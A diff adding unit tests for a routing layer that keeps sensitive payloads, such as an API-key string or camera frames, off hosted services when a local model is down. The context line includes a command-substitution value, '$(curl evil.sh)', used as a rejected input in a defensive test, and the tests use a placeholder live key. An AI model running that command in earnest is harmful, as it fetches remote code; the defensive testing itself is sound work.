@@ -67,3 +67,37 @@ test("S8: untrusted text must never be interpolated into a command or path", () 
   assert.throws(() => assertNotInterpolated("$(curl evil.sh)"), UnsafeEvidence);
   assert.equal(assertNotInterpolated("cam3"), true);
 });
+
+test("local down: a sensitive payload is REFUSED, never quietly sent off-box", () => {
+  assert.throws(
+    () => route({ task: TASK.PLAN, payload: "key sk_live_ABCDEFGHIJKLMNOP1234", localAvailable: false }),
+    RoutingRefused,
+    "falling back to hosted here would be exactly the leak the rule exists to prevent",
+  );
+});
+
+test("local down: perception refuses rather than shipping frames off-box", () => {
+  assert.throws(
+    () => route({ task: TASK.PERCEIVE, payload: "frame", localAvailable: false }),
+    RoutingRefused,
+  );
+});
+
+test("local down: the classifier degrades to static rules, it does not go hosted", () => {
+  const r = route({ task: TASK.CLASSIFY, payload: "is this reversible", localAvailable: false });
+  assert.equal(r.egress, "none");
+  assert.equal(r.degraded, true);
+  assert.match(r.reason, /static rules/);
+});
+
+test("local down but payload is benign: planning still works hosted", () => {
+  const r = route({ task: TASK.PLAN, payload: "a stopped vehicle on cam3", localAvailable: false });
+  assert.equal(r.egress, "hosted");
+});
+
+test("both down: refuse", () => {
+  assert.throws(
+    () => route({ task: TASK.PLAN, payload: "benign", localAvailable: false, hostedAvailable: false }),
+    RoutingRefused,
+  );
+});
